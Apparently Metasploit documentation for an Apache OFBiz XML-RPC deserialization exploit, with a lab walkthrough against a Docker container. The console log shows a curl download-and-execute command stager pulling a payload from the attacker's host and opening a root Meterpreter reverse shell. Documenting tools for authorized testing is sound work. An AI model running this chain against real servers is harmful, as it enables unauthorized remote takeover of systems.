## Vulnerable Application

### Description

This module exploits a Java deserialization vulnerability in Apache
OFBiz's unauthenticated XML-RPC endpoint `/webtools/control/xmlrpc` for
versions prior to 17.12.04.

### Setup

You can use <https://hub.docker.com/r/opensourceknight/ofbiz>.

## Verification Steps

Follow [Setup](#setup) and [Scenarios](#scenarios).

## Targets

### 0

This executes a Unix command.

### 1

This uses a Linux dropper to execute code.

## Scenarios

### Apache OFBiz from [Docker](#setup).

```
msf6 > use exploit/linux/http/apache_ofbiz_deserialiation
[*] Using configured payload linux/x64/meterpreter_reverse_https
msf6 exploit(linux/http/apache_ofbiz_deserialiation) > options

Module options (exploit/linux/http/apache_ofbiz_deserialiation):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      8080             yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       Base path
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


Payload options (linux/x64/meterpreter_reverse_https):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The local listener hostname
   LPORT  8443             yes       The local listener port
   LURI                    no        The HTTP Path


Exploit target:

   Id  Name
   --  ----
   1   Linux Dropper


msf6 exploit(linux/http/apache_ofbiz_deserialiation) > set rhosts 127.0.0.1
rhosts => 127.0.0.1
msf6 exploit(linux/http/apache_ofbiz_deserialiation) > set lhost 192.168.1.7
lhost => 192.168.1.7
msf6 exploit(linux/http/apache_ofbiz_deserialiation) > set srvport 8888
srvport => 8888
msf6 exploit(linux/http/apache_ofbiz_deserialiation) > run

[*] Started HTTPS reverse handler on https://192.168.1.7:8443
[*] Executing automatic check (disable AutoCheck to override)
[+] The target is vulnerable. Target can deserialize arbitrary data.
[*] Executing Linux Dropper for linux/x64/meterpreter_reverse_https
[*] Using URL: http://0.0.0.0:8888/ewbrAfHg5Vcycwj
[*] Local IP: http://10.3.227.250:8888/ewbrAfHg5Vcycwj
[*] Generated command stager: ["curl -so /tmp/IgxzbqAX http://192.168.1.7:8888/ewbrAfHg5Vcycwj", "chmod +x /tmp/IgxzbqAX", "/tmp/IgxzbqAX", "rm -f /tmp/IgxzbqAX"]
[*] Executing command: curl -so /tmp/IgxzbqAX http://192.168.1.7:8888/ewbrAfHg5Vcycwj
[+] Successfully executed command: curl -so /tmp/IgxzbqAX http://192.168.1.7:8888/ewbrAfHg5Vcycwj
[*] Client 192.168.1.7 (curl/7.38.0) requested /ewbrAfHg5Vcycwj
[*] Sending payload to 192.168.1.7 (curl/7.38.0)
[*] Command Stager progress -  53.45% done (62/116 bytes)
[*] Executing command: chmod +x /tmp/IgxzbqAX
[+] Successfully executed command: chmod +x /tmp/IgxzbqAX
[*] Command Stager progress -  72.41% done (84/116 bytes)
[*] Executing command: /tmp/IgxzbqAX
[+] Successfully executed command: /tmp/IgxzbqAX
[*] https://192.168.1.7:8443 handling request from 192.168.1.7; (UUID: plyeutdr) Redirecting stageless connection from /EI9Mkx6Cru4-XjhcYWjEVQ5gKO8Gb with UA 'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko'
[*] https://192.168.1.7:8443 handling request from 192.168.1.7; (UUID: plyeutdr) Redirecting stageless connection from /EI9Mkx6Cru4-XjhcYWjEVQQXixGiicHEpxpSJC_OVeDqmG2NowcNc with UA 'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko'
[*] https://192.168.1.7:8443 handling request from 192.168.1.7; (UUID: plyeutdr) Attaching orphaned/stageless session...
[*] Command Stager progress -  83.62% done (97/116 bytes)
[*] Executing command: rm -f /tmp/IgxzbqAX
[+] Successfully executed command: rm -f /tmp/IgxzbqAX
[*] Command Stager progress - 100.00% done (116/116 bytes)
[*] Meterpreter session 1 opened (192.168.1.7:8443 -> 192.168.1.7:54125) at 2020-08-14 15:54:36 -0500
[*] Server stopped.

meterpreter > getuid
Server username: root @ 298e7fba3ec9 (uid=0, gid=0, euid=0, egid=0)
meterpreter > sysinfo
Computer     : 172.17.0.2
OS           : Debian 8.4 (Linux 4.19.76-linuxkit)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter >
```
